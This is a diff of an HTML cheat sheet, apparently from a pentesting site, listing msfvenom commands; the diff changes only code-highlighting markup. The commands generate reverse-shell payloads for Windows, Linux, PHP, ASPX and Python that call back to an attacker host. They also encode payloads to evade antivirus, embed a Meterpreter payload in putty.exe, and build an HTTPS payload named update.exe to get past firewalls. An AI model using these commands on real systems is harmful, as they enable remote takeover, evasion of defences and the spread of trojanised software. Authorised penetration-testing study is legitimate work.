@@ -126,59 +126,59 @@
 <p><strong>MSFVenom</strong> is a component of Metasploit used to generate Payloads (shellcode, executables) to trigger shells.</p>
 <h2>Top 10 Useful Commands</h2>
 <h3>1. List Payloads</h3>
-<pre class="codehilite"><code class="language-bash">msfvenom -l payloads
-</code></pre>
+<div class="codehilite"><pre><span></span><code>msfvenom<span class="w"> </span>-l<span class="w"> </span>payloads
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Show all available payloads.</p>
 <h3>2. Windows Reverse TCP (Exe)</h3>
-<pre class="codehilite"><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe
-</code></pre>
+<div class="codehilite"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/x64/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.10.10.10<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>shell.exe
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Generate a Windows executable reverse shell.</p>
 <h3>3. Linux Reverse TCP (Elf)</h3>
-<pre class="codehilite"><code class="language-bash">msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
-</code></pre>
+<div class="codehilite"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x64/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.10.10.10<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span>-f<span class="w"> </span>elf<span class="w"> </span>-o<span class="w"> </span>shell.elf
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Generate a Linux binary payload.</p>
 <h3>4. Web Payload (PHP)</h3>
-<pre class="codehilite"><code class="language-bash">msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=4444 -f raw &gt; shell.php
-</code></pre>
+<div class="codehilite"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>php/reverse_php<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.10.10.10<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span>-f<span class="w"> </span>raw<span class="w"> </span>&gt;<span class="w"> </span>shell.php
+</code></pre></div>
 
 <p><strong>Explanation:</strong> PHP reverse shell for web servers.</p>
 <h3>5. Web Payload (ASPX)</h3>
-<pre class="codehilite"><code class="language-bash">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f aspx -o shell.aspx
-</code></pre>
+<div class="codehilite"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.10.10.10<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span>-f<span class="w"> </span>aspx<span class="w"> </span>-o<span class="w"> </span>shell.aspx
+</code></pre></div>
 
 <p><strong>Explanation:</strong> ASPX shell for IIS servers.</p>
 <h3>6. Script Payload (Python)</h3>
-<pre class="codehilite"><code class="language-bash">msfvenom -p cmd/unix/reverse_python LHOST=10.10.10.10 LPORT=4444 -f raw &gt; shell.py
-</code></pre>
+<div class="codehilite"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>cmd/unix/reverse_python<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.10.10.10<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span>-f<span class="w"> </span>raw<span class="w"> </span>&gt;<span class="w"> </span>shell.py
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Python script payload.</p>
 <h3>7. List Formats</h3>
-<pre class="codehilite"><code class="language-bash">msfvenom --list formats
-</code></pre>
+<div class="codehilite"><pre><span></span><code>msfvenom<span class="w"> </span>--list<span class="w"> </span>formats
+</code></pre></div>
 
 <p><strong>Explanation:</strong> See valid output formats (<code>-f</code>) like exe, elf, war, raw, py, c.</p>
 <h3>8. Encode Payload (Bypass AV)</h3>
-<pre class="codehilite"><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp ... -e x86/shikata_ga_nai -i 5
-</code></pre>
+<div class="codehilite"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span>...<span class="w"> </span>-e<span class="w"> </span>x86/shikata_ga_nai<span class="w"> </span>-i<span class="w"> </span><span class="m">5</span>
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Encode the shellcode 5 times (<code>-i 5</code>) using Shikata Ga Nai to evade simple AV signatures.</p>
 <h3>9. Inject into Real Binary</h3>
-<pre class="codehilite"><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp ... -x putty.exe -k -f exe -o putty_evil.exe
-</code></pre>
+<div class="codehilite"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span>...<span class="w"> </span>-x<span class="w"> </span>putty.exe<span class="w"> </span>-k<span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>putty_evil.exe
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Embed payload into <code>putty.exe</code> while keeping the original functionality (<code>-k</code>).</p>
 <h3>10. Shellcode (C format)</h3>
-<pre class="codehilite"><code class="language-bash">msfvenom -p windows/x64/exec CMD=calc.exe -f c
-</code></pre>
+<div class="codehilite"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/x64/exec<span class="w"> </span><span class="nv">CMD</span><span class="o">=</span>calc.exe<span class="w"> </span>-f<span class="w"> </span>c
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Output raw C-formatted bytes, useful for exploit development buffer overflows.</p>
 <h2>The Most Powerful Command</h2>
 <p>(The "Stageless" Meterpreter HTTPS):</p>
-<pre class="codehilite"><code class="language-bash">msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.10.10.10 LPORT=443 -f exe -o update.exe
-</code></pre>
+<div class="codehilite"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/x64/meterpreter_reverse_https<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.10.10.10<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span><span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>update.exe
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Uses HTTPS (encrypted traffic) on port 443 (allowed by firewalls), 64-bit, and "meterpreter_" (stageless) for max stability.</p>
         </div>
